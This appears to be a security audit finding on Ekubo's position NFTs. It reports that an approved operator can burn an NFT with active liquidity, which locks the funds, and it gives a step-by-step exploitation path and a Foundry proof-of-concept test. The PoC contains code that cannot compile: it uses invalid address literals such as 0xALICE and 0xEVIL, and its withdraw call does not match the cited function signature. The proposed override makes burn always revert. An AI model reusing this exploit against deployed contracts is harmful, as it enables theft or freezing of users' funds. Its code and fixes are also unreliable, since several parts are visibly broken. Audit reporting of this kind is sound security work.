## Title
Approved Operators Can Permanently Lock User Liquidity by Burning Position NFTs

## Summary
The `burn()` function allows approved operators to burn NFTs even when the position contains active liquidity. When users mint NFTs using the parameterless `mint()` function with a pseudo-random salt, burning the NFT results in permanent loss of liquidity access because the original salt cannot be recovered to re-mint the NFT ID.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/BaseNonfungibleToken.sol` (function `burn()`, line 133) [1](#0-0) 

**Intended Logic:** The burn function is designed to allow NFT owners to destroy their tokens after withdrawing all liquidity, enabling gas refunds. The function uses the `authorizedForNft` modifier to allow both owners and approved operators to burn tokens. [2](#0-1) 

**Actual Logic:** The burn function has no validation to ensure the position has zero liquidity before burning. When an approved operator burns an NFT with active liquidity, the NFT ownership is removed but the position data remains in Core's storage. If the user minted the NFT using the parameterless `mint()` function, the pseudo-random salt is lost forever, making the NFT ID unrecoverable. [3](#0-2) 

The NFT ID generation is deterministic based on minter address, salt, chainid, and contract address: [4](#0-3) 

Position operations require NFT ownership via the `authorizedForNft` modifier: [5](#0-4) 

**Exploitation Path:**
1. Alice calls `positions.mint()` to create NFT with ID X using pseudo-random salt (salt = keccak256(prevrandao, gas))
2. Alice calls `positions.deposit(X, poolKey, tickLower, tickUpper, maxAmount0, maxAmount1, minLiquidity)` to add liquidity worth substantial value
3. Alice approves Bob as an operator for NFT X (using ERC721's `approve(Bob, X)`) for a limited purpose like collecting fees
4. Bob maliciously calls `positions.burn(X)` - the `authorizedForNft(X)` modifier passes since Bob is approved
5. The NFT is burned and Alice no longer owns it
6. Alice cannot call `withdraw(X, ...)` because `authorizedForNft(X)` fails - she doesn't own NFT X
7. Alice cannot re-mint NFT X because the original salt was pseudo-random and not stored anywhere
8. The position data remains in Core under `(poolId, Positions_contract, positionId)` where positionId includes bytes24(uint192(X))
9. Alice's liquidity is permanently locked with no recovery path

**Security Property Broken:** 
- **Withdrawal Availability Invariant**: "All positions MUST be withdrawable at any time"
- **Position Ownership**: Users lose permanent access to their positions and funds

## Impact Explanation
- **Affected Assets**: User liquidity (both token0 and token1) deposited in positions, plus accumulated swap fees
- **Damage Severity**: Complete permanent loss of all liquidity and fees in the position. If the position contains 100 ETH worth of liquidity, the entire amount becomes irrecoverable.
- **User Impact**: Any user who: (1) mints NFTs using the parameterless `mint()` function, (2) deposits liquidity, and (3) approves an operator for any purpose is vulnerable. The malicious operator can lock all liquidity across all tick ranges for that NFT ID.

## Likelihood Explanation
- **Attacker Profile**: Any approved operator for an NFT - this could be a smart contract authorized to collect fees, a third-party protocol integration, or a compromised approval
- **Preconditions**: User must have minted NFT using parameterless `mint()` and deposited liquidity. User must have approved an operator (common practice for automated fee collection services).
- **Execution Complexity**: Single transaction calling `burn(nftId)` - trivial to execute
- **Frequency**: Can be exploited once per NFT, affecting all positions associated with that NFT ID. Given that users commonly approve operators for fee collection and the parameterless `mint()` is a primary minting method, this affects a significant portion of protocol users.

## Recommendation

Add a liquidity check to the burn function to prevent burning NFTs with active positions:

```solidity
// In src/base/BaseNonfungibleToken.sol, function burn(), line 133:

// CURRENT (vulnerable):
// No check for position liquidity before burning

// FIXED:
function burn(uint256 id) external payable authorizedForNft(id) {
    // Prevent burning if any position exists with this NFT ID
    // This must be checked in the derived contract (Positions.sol)
    // Override this function in Positions.sol to add the check
    _burn(id);
}
```

Better solution - implement in `src/Positions.sol`:

```solidity
// Override burn in Positions.sol with liquidity validation:

/// @notice Burns an NFT after ensuring all positions are withdrawn
/// @dev Only allows burning if the NFT has no active liquidity in any position
/// @param id The NFT token ID to burn
function burn(uint256 id) external payable override authorizedForNft(id) {
    // Users should not be able to burn NFTs with active positions
    // This is a safety check to prevent permanent liquidity lock
    // Note: This only checks a hint of common positions, not exhaustive
    // Users should withdraw all liquidity before burning
    
    // Alternatively, document clearly that users must track their positions
    // and withdraw all liquidity before burning, and that approved operators
    // should never burn NFTs
    revert("Must withdraw all liquidity before burning");
}
```

**Alternative mitigation:** Store the salt used in `mint()` in a mapping so users can recover their NFT IDs if burned. However, this significantly increases gas costs and storage requirements.

**Best practice mitigation:** Clearly document that:
1. Users should ONLY approve operators for specific actions, not blanket approvals
2. Users should always use `mint(bytes32 salt)` with a known salt they can recover
3. Users must withdraw all liquidity before burning NFTs
4. Implement a view function to check if an NFT has any active liquidity before allowing burns

## Proof of Concept

```solidity
// File: test/Exploit_BurnLocksFunds.t.sol
// Run with: forge test --match-test test_OperatorBurnsNFTLockingLiquidity -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_BurnLocksFunds is FullTest {
    address alice = address(0xALICE);
    address maliciousOperator = address(0xEVIL);
    
    function setUp() public {
        // Deploy protocol (inherited from FullTest)
    }
    
    function test_OperatorBurnsNFTLockingLiquidity() public {
        // SETUP: Alice creates a position with liquidity
        vm.startPrank(alice);
        
        // Give Alice tokens
        token0.mint(alice, 1000e18);
        token1.mint(alice, 1000e18);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        // Create pool
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, CallPoints({bits: 0}));
        
        // Alice mints NFT with pseudo-random salt (common usage)
        uint256 nftId = positions.mint();
        
        // Alice deposits substantial liquidity
        (uint128 liquidity, uint128 amount0, uint128 amount1) = 
            positions.deposit(nftId, poolKey, -100, 100, 100e18, 100e18, 0);
        
        // Verify liquidity was deposited
        assertGt(liquidity, 0, "Liquidity should be deposited");
        assertGt(amount0, 0, "Token0 should be deposited");
        assertGt(amount1, 0, "Token1 should be deposited");
        
        // Alice approves operator for fee collection (common practice)
        positions.approve(maliciousOperator, nftId);
        
        vm.stopPrank();
        
        // EXPLOIT: Malicious operator burns the NFT
        vm.startPrank(maliciousOperator);
        positions.burn(nftId);
        vm.stopPrank();
        
        // VERIFY: Alice has lost access to her liquidity permanently
        vm.startPrank(alice);
        
        // Alice tries to withdraw - this will revert with NotUnauthorizedForToken
        vm.expectRevert();
        positions.withdraw(nftId, poolKey, -100, 100, liquidity);
        
        // Alice tries to collect fees - also reverts
        vm.expectRevert();
        positions.collectFees(nftId, poolKey, -100, 100);
        
        // Alice cannot re-mint the same NFT ID because the salt is lost
        // The parameterless mint() used prevrandao() and gas() which cannot be reproduced
        uint256 newId = positions.mint();
        assertNotEq(newId, nftId, "New mint creates different ID");
        
        // The liquidity is still in Core but inaccessible
        (uint128 remainingLiquidity,,,,) = 
            positions.getPositionFeesAndLiquidity(nftId, poolKey, -100, 100);
        assertGt(remainingLiquidity, 0, "Liquidity is locked in Core");
        
        vm.stopPrank();
        
        // IMPACT: Alice's funds are permanently locked
        console.log("Vulnerability confirmed: Alice lost access to", liquidity, "liquidity");
        console.log("Token0 locked:", amount0);
        console.log("Token1 locked:", amount1);
    }
}
```

## Notes

This vulnerability is particularly severe because:

1. **Common User Pattern**: Users frequently use the parameterless `mint()` function as it's simpler and doesn't require managing salts. The pseudo-random salt generation appears convenient but creates unrecoverable NFT IDs.

2. **Trusted Operator Assumption**: Users typically approve operators for legitimate purposes (automated fee collectors, yield aggregators, portfolio managers). The assumption that approved operators won't burn NFTs is reasonable but creates a security gap.

3. **No Recovery Mechanism**: Unlike other protocols where position data might be recoverable through alternative methods, Ekubo's deterministic NFT ID system combined with pseudo-random salt generation creates a permanent lock scenario.

4. **Silent Failure**: The system provides no warning or protection against this attack vector. The `burn()` function in BaseNonfungibleToken executes successfully even with active liquidity.

5. **Violates Core Invariant**: The README explicitly states "All positions MUST be withdrawable at any time" - this vulnerability directly violates this fundamental protocol guarantee.

The recommended fix should prevent burning NFTs with active liquidity positions, or at minimum, clearly document this risk and encourage users to only use `mint(bytes32 salt)` with known, recoverable salts.

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L92-102)
```text
    function saltToId(address minter, bytes32 salt) public view returns (uint256 result) {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, minter)
            mstore(add(free, 32), salt)
            mstore(add(free, 64), chainid())
            mstore(add(free, 96), address())

            result := keccak256(free, 128)
        }
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L133-135)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/BasePositions.sol (L120-128)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
```
